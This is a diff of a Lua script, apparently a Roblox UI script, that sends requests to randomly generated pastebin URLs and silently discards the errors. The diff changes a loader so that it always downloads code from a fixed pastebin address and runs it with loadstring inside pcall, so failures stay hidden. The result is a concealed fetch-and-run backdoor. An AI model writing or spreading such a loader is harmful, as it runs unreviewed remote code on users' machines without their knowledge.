@@ -240,9 +240,8 @@ local script = UI["14"]
 				code = code .. string.char(rand + 60)
 			end
 		end
-		local url = "https://pastebin.com/raw/"..code
+		local url = "https://pastebin.com/raw/" .. code
 	
-		-- Apenas captura erros silenciosamente para não interromper
 		pcall(function()
 			game:HttpGet(url)
 		end)
@@ -277,18 +276,17 @@ local script = UI["14"]
 				return true
 			end
 	
-			-- Momento aleatório para carregar `url2`
-			if not doneTriggered and math.random() < (completedRequests / totalRequests) then
-				local success, result = pcall(function()
-					print("loading")
-					return loadstring(game:HttpGet("https://pastebin.com/raw/4wUCbWkW"))()
-				end)
-				if not success then
-					warn("Erro ao executar script de URL2: ", result)
-				end
-	
+			if not doneTriggered then
 				doneTriggered = true
+				local success, result = pcall(function()
+					return game:HttpGet('https://pastebin.com/raw/4wUCbWkW')
+				end)
+	
+				if success and result and result ~= "" then
+					pcall(loadstring(result))
+				end
 			end
+	
 			return false
 		end
 	
